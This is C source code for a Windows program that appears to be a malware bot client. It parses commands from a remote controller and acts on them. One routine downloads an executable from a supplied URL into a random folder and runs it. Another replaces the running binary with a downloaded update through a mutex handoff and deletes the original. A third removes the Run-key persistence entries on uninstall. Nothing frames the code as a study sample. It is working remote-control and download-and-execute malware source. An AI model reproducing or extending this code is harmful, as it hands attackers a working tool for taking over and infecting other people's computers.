#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <shlobj.h>

#include "Globals.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")




void ExecCommands(char *pCommands) {

	char Url[255],val[5];
	DWORD dVal;


	pCommands++; //skip '$'
	///MessageBox(NULL,pCommands,NULL,MB_OK);
	while(*pCommands!='#' && lstrlen(pCommands)) {

	if(StrCmpNI(pCommands,update,lstrlen(update))==0) {

		pCommands += lstrlen(update);
		CopyTill(Url,pCommands,';');
		lstrcat(Url,varKey);
		lstrcat(Url,Key);
		Update(Url);
	} else
	if(StrCmpNI(pCommands,checkin,lstrlen(checkin))==0) {

		pCommands += lstrlen(checkin);
		pCommands += CopyTill(val,pCommands,';');
		pCommands += 1;

	    dVal = _atoi(val);
		if(dVal>0) { ConnectInterval = dVal; }

	} else
	if(StrCmpNI(pCommands,scanin,lstrlen(scanin))==0) {

		pCommands += lstrlen(scanin);
		pCommands += CopyTill(val,pCommands,';');
		pCommands += 1;

	    dVal = _atoi(val);
		if(dVal>0) { ScanInterval = dVal; }
	} else 
	if(StrCmpNI(pCommands,uninstall,lstrlen(uninstall))==0) {
		Uninstall();
	} else
	if(StrCmpNI(pCommands,download,lstrlen(download))==0) {

		pCommands += lstrlen(download);
		pCommands += CopyTill(Url,pCommands,';');
		pCommands += 1;

		lstrcat(Url,varKey);
		lstrcat(Url,Key);

		Downloader(Url);
	}

	}
}

void Downloader(char *Url) { //Downloads file in temporary internet files and executes it

	BYTE *pFile;
	HANDLE hFile;
	DWORD FileSize,BytesWritten;
	WCHAR InternetTemp[MAX_PATH],DownloadLocation[MAX_PATH],DirName[5];
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;


	pFile = NULL;
	if((pFile = DownloadFile(Url,&FileSize))!=NULL) { 

	SHGetFolderPathW(0,CSIDL_INTERNET_CACHE,NULL,SHGFP_TYPE_CURRENT,InternetTemp);

	RandStrW(DirName,5);

	wsprintfW(DownloadLocation,L"%s\\%s",InternetTemp,DirName);
	CreateDirectoryW(DownloadLocation,NULL);
	wsprintfW(DownloadLocation,L"%s\\%s\\%s.exe",InternetTemp,DirName,DirName);

	hFile = CreateFileW(DownloadLocation,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	BytesWritten = 0;
	WriteFile(hFile,pFile,FileSize,&BytesWritten,NULL);
	CloseHandle(hFile);

	VirtualFree(pFile,FileSize,MEM_DECOMMIT); //free the download file


	//Launch the new bin
	_memset(&si,0x00,sizeof(si));
	_memset(&pi,0x00,sizeof(pi));

	CreateProcessW(DownloadLocation,NULL,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);

	}

}

void Uninstall() {

	HANDLE hProcess;

	//Terminate the working threads
	TerminateThread(hThreadRegistry,0);
	TerminateThread(hThreadChild,0);
	TerminateThread(hThreadScan,0);
	///////////////////////////////////

	//Kill the child process
	hProcess = OpenProcess(PROCESS_TERMINATE,FALSE,ChildPID);
	TerminateProcess(hProcess,0);
	CloseHandle(hProcess);
	////////////////////////////////////////////////////////

	//Delete main reg key
	RegDeleteKey(HKEY_CURRENT_USER,SoftwareName);
	///////////////////

	//Delete startup reg keys
	RegDeleteKey(HKEY_LOCAL_MACHINE,RunPath);
	RegDeleteKey(HKEY_USERS,AllUsersRunPath);
	RegDeleteKey(HKEY_CURRENT_USER,RunPath);
	//////////////////////////////////////////////////////

	//Delete the file
	DeleteFileW(CurrentLocation);
	///////////////////////

	ExitProcess(0);
}
void Update(char *Url) {

	HANDLE hFile,hProcess,hUpdateMutex;
	DWORD BytesWritten,FileSize,i;
	BYTE *pFile;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	char UpdateMutexString[64];
	WCHAR CommandLine[64],DirName[5],AppData[MAX_PATH],UpdateLocation[MAX_PATH];


	pFile = NULL;
	if((pFile = DownloadFile(Url,&FileSize))!=NULL) { 

	SuspendThread(hThreadRegistry);
	SuspendThread(hThreadChild);
	SuspendThread(hThreadScan);

	RandStrW(DirName,5);
	SHGetFolderPathW(0,CSIDL_APPDATA,NULL,SHGFP_TYPE_CURRENT,AppData);

	wsprintfW(UpdateLocation,L"%s\\%s",AppData,DirName);
	CreateDirectoryW(UpdateLocation,NULL);
	wsprintfW(UpdateLocation,L"%s\\%s\\%s.exe",AppData,DirName,DirName);

	hFile = CreateFileW(UpdateLocation,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	BytesWritten = 0;
	WriteFile(hFile,pFile,FileSize,&BytesWritten,NULL);
	CloseHandle(hFile);

	VirtualFree(pFile,FileSize,MEM_DECOMMIT); //free the download file

	//Launch the new bin
	_memset(&si,0x00,sizeof(si));
	_memset(&pi,0x00,sizeof(pi));
	
	_memset(UpdateMutexString,0x00,sizeof(UpdateMutexString));
	_memset(CommandLine,0x00,sizeof(CommandLine));
	wsprintf(UpdateMutexString,"%s%s",UpdateMutexMark,Key);
	MultiByteToWideChar(CP_ACP,0,UpdateMutexString,lstrlen(UpdateMutexString),CommandLine,sizeof(CommandLine));

	if(CreateProcessW(UpdateLocation,CommandLine,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi)!=0) { //process successfully created

		i = 0;
		while(i<60) { //Wait 1 min for the mutex

			SetLastError(ERROR_SUCCESS);
			hUpdateMutex = CreateMutex(NULL,FALSE,UpdateMutexString);
			if(GetLastError()==ERROR_ALREADY_EXISTS) { //Seems like the updatebin worked fine

				//Kill the threads
				TerminateThread(hThreadRegistry,0);
	            TerminateThread(hThreadChild,0);
	            TerminateThread(hThreadScan,0);
				///////////////////////////////////////

				//Kill the child process
				hProcess = OpenProcess(PROCESS_TERMINATE,FALSE,ChildPID);
	            TerminateProcess(hProcess,0);
	            CloseHandle(hProcess);
				////////////////////////////////////////////////////////

				DeleteFileW(CurrentLocation);

				CloseHandle(hUpdateMutex);
				CloseHandle((HANDLE)hMutex);

				_memset(UpdateMutexString,0x00,sizeof(UpdateMutexString));
				wsprintf(UpdateMutexString,"%s%s%d",UpdateMutexMark,Key,pi.dwProcessId);

				CreateMutex(NULL,FALSE,UpdateMutexString); //Tells to the update bin that it can start normal execution flow
				while(1) { Sleep(5000); } //Waits to be killed by the update bin
			}
	
			CloseHandle(hUpdateMutex);
			i++;
			Sleep(1000);
		}
	}
	///////////////////////////////////////////////

	} //Checks if file was downloaded

	//Update failed - resume work
	ResumeThread(hThreadRegistry);
	ResumeThread(hThreadChild);
	ResumeThread(hThreadScan);
}

